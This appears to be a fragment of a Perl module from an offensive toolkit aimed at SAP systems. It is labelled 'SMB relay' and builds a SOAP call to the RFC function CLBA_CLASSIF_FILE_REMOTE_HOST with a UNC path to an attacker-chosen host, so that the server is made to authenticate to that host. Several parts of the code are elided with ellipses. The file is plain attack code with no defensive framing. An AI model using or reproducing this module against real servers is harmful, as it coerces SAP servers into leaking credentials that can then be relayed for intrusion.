#!/usr/bin/perl
# Module SMB relay  (CLBA_CLASSIF_FILE_REMOTE_HOST)


# CONFIG
######################
my $desc ="SMB relay  (CLBA_CLASSIF_FILE_REMOTE_HOST) \n\t Usage: black.pl .. .. -m id_module  <path> \n\t UNC path like this: \\\\192.168.0.101\n"; 
our $funcName="CLBA_CLASSIF_FILE_REMOTE_HOSTsmbRelay";
...
sub CLBA_CLASSIF_FILE_REMOTE_HOSTsmbRelay()
{
	...
	<SOAP-ENV:Body>
		<m:CLBA_CLASSIF_FILE_REMOTE_HOST xmlns:m="urn:sap-com:document:sap:rfc:functions">
			<CLASSIF_FILE>
				<item>
					<ZEILE>a</ZEILE>
				</item>
		...
		</m:CLBA_CLASSIF_FILE_REMOTE_HOST>
	</SOAP-ENV:Body>
</SOAP-ENV:Envelope>
	';
